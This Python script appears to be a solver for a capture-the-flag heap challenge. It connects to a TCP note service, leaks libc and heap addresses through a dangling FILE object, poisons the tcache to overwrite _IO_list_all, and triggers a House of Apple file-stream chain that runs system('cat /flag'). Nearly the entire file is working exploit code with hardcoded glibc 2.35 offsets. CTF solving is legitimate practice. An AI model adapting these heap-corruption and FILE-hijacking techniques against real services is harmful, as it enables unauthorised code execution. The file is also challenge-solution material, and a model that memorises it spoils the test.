from __future__ import annotations

import json
import re
import socket
import struct
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parent
PROMPT = b">> "
CHANGE_PROMPT = b"Aaaanddd please enter your changes\n>> "
VIEW_PREFIX = b"Here is your hate note: "
FLAG_PATTERN = re.compile(rb"K17\{[^}\r\n]*\}")

# Ubuntu 22.04, GLIBC 2.35-0ubuntu3.14, selected by the Dockerfile digest.
IO_WFILE_JUMPS = 0x2170C0
IO_FILE_JUMPS = 0x217600
IO_LIST_ALL = 0x21B680
MAIN_ARENA_TOP = 0x21ACE0
STDOUT_LOCK = 0x21CA70
SYSTEM = 0x50D70

FILE_CHUNK_SIZE = 472
LIBC_LEAK_SIZE = 464
FILE_HEAP_FROM_TOP = 0x1F00
VICTIM_HEAP_FROM_TOP = 0xD10
HISTORY_PREFIX = b"Edit made to note id 0. Previous version is "


def p32(value: int) -> bytes:
    return struct.pack("<I", value & 0xFFFFFFFF)


def p64(value: int) -> bytes:
    return struct.pack("<Q", value & 0xFFFFFFFFFFFFFFFF)


def u64(value: bytes) -> int:
    return struct.unpack("<Q", value.ljust(8, b"\x00"))[0]


def put(blob: bytearray, offset: int, value: bytes | int, width: int = 8) -> None:
    packed = value if isinstance(value, bytes) else value.to_bytes(width, "little", signed=False)
    blob[offset : offset + len(packed)] = packed


def load_endpoint() -> tuple[str, int]:
    data = json.loads((ROOT / "instance.json").read_text(encoding="utf-8"))
    endpoint = next(item for item in data["endpoints"] if item["name"] == "main")
    if endpoint["protocol"] != "tcp":
        raise ValueError("main endpoint must use tcp")
    return endpoint["host"], endpoint["port"]


class Tube:
    def __init__(self, host: str, port: int) -> None:
        self.sock = socket.create_connection((host, port), timeout=10)
        self.sock.settimeout(10)
        self.buffer = bytearray()

    def close(self) -> None:
        self.sock.close()

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, data: bytes | str | int) -> None:
        if not isinstance(data, bytes):
            data = str(data).encode()
        self.send(data + b"\n")

    def recv_until(self, marker: bytes) -> bytes:
        while True:
            position = self.buffer.find(marker)
            if position >= 0:
                end = position + len(marker)
                result = bytes(self.buffer[:end])
                del self.buffer[:end]
                return result
            chunk = self.sock.recv(4096)
            if not chunk:
                tail = bytes(self.buffer[-8192:]).hex()
                raise EOFError(f"connection closed before {marker!r}; buffered tail={tail}")
            self.buffer.extend(chunk)

    def recv_all(self) -> bytes:
        result = bytearray(self.buffer)
        self.buffer.clear()
        self.sock.settimeout(2)
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            result.extend(chunk)
        return bytes(result)


class Challenge:
    def __init__(self, tube: Tube) -> None:
        self.io = tube
        self.io.recv_until(PROMPT)

    def add(self, size: int, data: bytes) -> None:
        if len(data) != size:
            raise ValueError("note data must exactly match its declared size")
        self.io.sendline(1)
        self.io.recv_until(PROMPT)
        self.io.sendline(size)
        self.io.recv_until(PROMPT)
        self.io.send(data)
        self.io.recv_until(PROMPT)

    def delete(self, index: int) -> None:
        self.io.sendline(3)
        self.io.recv_until(PROMPT)
        self.io.sendline(index)
        self.io.recv_until(PROMPT)

    def history(self) -> bytes:
        self.io.sendline(5)
        return self.io.recv_until(PROMPT)

    def view(self, index: int) -> bytes:
        self.io.sendline(4)
        self.io.recv_until(PROMPT)
        self.io.sendline(index)
        return self.io.recv_until(PROMPT)

    def begin_edit(self, index: int) -> bytes:
        self.io.sendline(2)
        self.io.recv_until(PROMPT)
        self.io.sendline(index)
        return self.io.recv_until(CHANGE_PROMPT)

    def finish_edit(self, data: bytes) -> None:
        self.io.send(data)
        self.io.recv_until(PROMPT)

    def edit(self, index: int, data: bytes) -> bytes:
        result = self.begin_edit(index)
        self.finish_edit(data)
        return result


def fake_file_for_read(libc: int, address: int, count: int) -> bytes:
    fake = bytearray(FILE_CHUNK_SIZE)
    put(fake, 0x00, p32(0xFBAD0800))
    put(fake, 0x10, address)  # read_end == write_base avoids a seek on stdout
    put(fake, 0x20, address)
    put(fake, 0x28, address + count)
    put(fake, 0x30, address + count)
    put(fake, 0x38, 0)
    put(fake, 0x40, 0)
    put(fake, 0x70, 1, 4)
    put(fake, 0x78, 0xFFFFFFFFFFFFFFFF)
    put(fake, 0x88, libc + STDOUT_LOCK)
    put(fake, 0x90, 0xFFFFFFFFFFFFFFFF)
    put(fake, 0xC0, 0xFFFFFFFF, 4)
    put(fake, 0xD8, libc + IO_FILE_JUMPS)
    return bytes(fake)


def fake_file_for_write(libc: int, address: int) -> bytes:
    fake = bytearray(FILE_CHUNK_SIZE)
    put(fake, 0x00, p32(0xFBAD0800))
    put(fake, 0x10, address)
    put(fake, 0x20, address)
    put(fake, 0x28, address)
    put(fake, 0x30, address + 0x100)
    put(fake, 0x38, address)
    put(fake, 0x40, address + 0x100)
    put(fake, 0x70, 0xFFFFFFFF, 4)
    put(fake, 0x78, 0xFFFFFFFFFFFFFFFF)
    put(fake, 0x88, libc + STDOUT_LOCK)
    put(fake, 0x90, 0xFFFFFFFFFFFFFFFF)
    put(fake, 0xC0, 0xFFFFFFFF, 4)
    put(fake, 0xD8, libc + IO_FILE_JUMPS)
    return bytes(fake)


def house_of_apple(libc: int, fake_address: int) -> bytes:
    fake = bytearray(FILE_CHUNK_SIZE)
    put(fake, 0x00, b"  cat /flag\x00")
    put(fake, 0x20, 0)
    put(fake, 0x28, 1)
    put(fake, 0x68, 0)
    put(fake, 0x88, libc + STDOUT_LOCK)
    put(fake, 0xA0, fake_address + 0xE0)
    put(fake, 0xD8, libc + IO_WFILE_JUMPS)

    # _wide_data begins at fake_address + 0xe0.
    put(fake, 0xE0 + 0x18, 0)
    put(fake, 0xE0 + 0x30, 0)
    put(fake, 0xE0 + 0xE0, fake_address + 0x150)

    # The controlled wide vtable's __doallocate slot calls system(fp).
    put(fake, 0x150 + 0x68, libc + SYSTEM)
    return bytes(fake)


def exploit(host: str, port: int) -> bytes:
    tube = Tube(host, port)
    stage = "initialization"
    try:
        challenge = Challenge(tube)

        stage = "opening history stream"
        challenge.add(16, b"S" * 16)
        challenge.edit(0, b"T" * 16)  # fopen leaves the FILE object live

        for marker in range(1, 8):
            challenge.add(FILE_CHUNK_SIZE, bytes([0x40 + marker]) * FILE_CHUNK_SIZE)
        for index in range(1, 8):
            challenge.delete(index)

        stage = "closing history stream"
        challenge.history()  # fclose sends fp to unsorted bin (tcache is full)

        for marker in range(1, 8):
            challenge.add(FILE_CHUNK_SIZE, bytes([0x60 + marker]) * FILE_CHUNK_SIZE)

        stage = "leaking libc"
        leak_marker = b"L" * LIBC_LEAK_SIZE
        challenge.add(LIBC_LEAK_SIZE, leak_marker)
        view_output = challenge.view(8)
        start = view_output.index(VIEW_PREFIX + leak_marker) + len(VIEW_PREFIX + leak_marker)
        io_wfile_jumps = u64(view_output[start : start + 6])
        libc = io_wfile_jumps - IO_WFILE_JUMPS
        if libc <= 0 or libc & 0xFFF:
            raise RuntimeError("invalid libc leak")

        stage = "leaking heap"
        poison_target = libc + IO_LIST_ALL - LIBC_LEAK_SIZE
        challenge.delete(8)
        challenge.add(
            FILE_CHUNK_SIZE,
            fake_file_for_read(libc, poison_target, FILE_CHUNK_SIZE),
        )

        snapshot_output = challenge.begin_edit(8)
        libc_snapshot = snapshot_output[:FILE_CHUNK_SIZE]
        if len(libc_snapshot) != FILE_CHUNK_SIZE:
            raise RuntimeError("short libc data snapshot")
        challenge.finish_edit(fake_file_for_read(libc, libc + MAIN_ARENA_TOP, 8))

        heap_output = challenge.begin_edit(0)
        top = u64(heap_output[:8])
        if top <= 0 or top & 0xF:
            raise RuntimeError(f"invalid heap leak: {heap_output[:64].hex()}")

        fake_address = top - FILE_HEAP_FROM_TOP
        victim_address = top - VICTIM_HEAP_FROM_TOP
        encoded_target = poison_target ^ (victim_address >> 12)
        encoded_prefix = p64(encoded_target)[:6]
        if b"\x00" in encoded_prefix or b"\n" in encoded_prefix:
            raise RuntimeError("ASLR produced a delimiter in the tcache poison")
        poison_source = encoded_prefix + b"\x00" + b"P" * 9
        challenge.finish_edit(poison_source)

        stage = "building tcache write primitive"
        write_address = victim_address - len(HISTORY_PREFIX)
        challenge.edit(8, fake_file_for_write(libc, write_address))
        stage = "poisoning tcache"
        challenge.delete(6)
        challenge.delete(7)
        challenge.edit(0, poison_source)

        stage = "overwriting IO_list_all"
        challenge.add(FILE_CHUNK_SIZE, b"V" * FILE_CHUNK_SIZE)
        challenge.edit(8, house_of_apple(libc, fake_address))
        list_payload = bytearray(libc_snapshot)
        put(list_payload, LIBC_LEAK_SIZE, fake_address)
        challenge.add(FILE_CHUNK_SIZE, bytes(list_payload))

        stage = "triggering House of Apple"
        tube.sendline(6)
        output = tube.recv_all()
        match = FLAG_PATTERN.search(output)
        if match is None:
            raise RuntimeError("exploit completed without a flag")
        return match.group(0)
    except (EOFError, OSError, RuntimeError, ValueError) as error:
        raise RuntimeError(f"{stage}: {error}") from error
    finally:
        tube.close()


def main() -> int:
    host, port = load_endpoint()
    last_error: Exception | None = None
    for _ in range(8):
        try:
            flag = exploit(host, port)
        except (EOFError, OSError, RuntimeError, ValueError) as error:
            last_error = error
            continue
        sys.stdout.buffer.write(flag)
        return 0
    print(f"exploit failed after retries: {last_error}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
